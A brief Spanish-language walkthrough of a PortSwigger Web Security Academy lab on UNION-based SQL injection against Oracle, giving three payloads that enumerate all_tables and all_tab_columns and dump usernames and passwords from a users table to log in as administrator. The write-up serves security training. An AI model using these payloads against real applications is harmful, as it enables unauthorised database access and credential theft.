Laboratorio 10

Exfiltrar base de datos (Oracle)

PortSwigger Web Security Academy

Introducción

Este laboratorio es similar al anterior pero en un entorno Oracle. El objetivo es extraer información iterativamente de las tablas del esquema para encontrar al usuario administrador.

Desarrollo

En lugar de information_schema, bases de datos como Oracle exponen esta información en tablas del sistema propietario como all_tables y all_tab_columns.

Pasos, Pruebas y Payloads

1. Extraer los nombres de las tablas: '+UNION+SELECT+table_name,NULL+FROM+all_tables--. Identificamos USERS_XYZ.

2. Extraer columnas de la tabla identificada: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XYZ'--. Identificamos USERNAME_1 y PASSWORD_2.

3. Volcamos la información usando las variables aleatorizadas: '+UNION+SELECT+USERNAME_1,+PASSWORD_2+FROM+USERS_XYZ-- y conseguimos logearnos.

Explicación

Este proceso subraya que aunque Oracle esconde metadatos en tablas diferentes (usualmente precedidas con all_ o user_), el proceso para cartografiar la base y el objetivo sigue exactamente la misma lógica constructora iterativa.
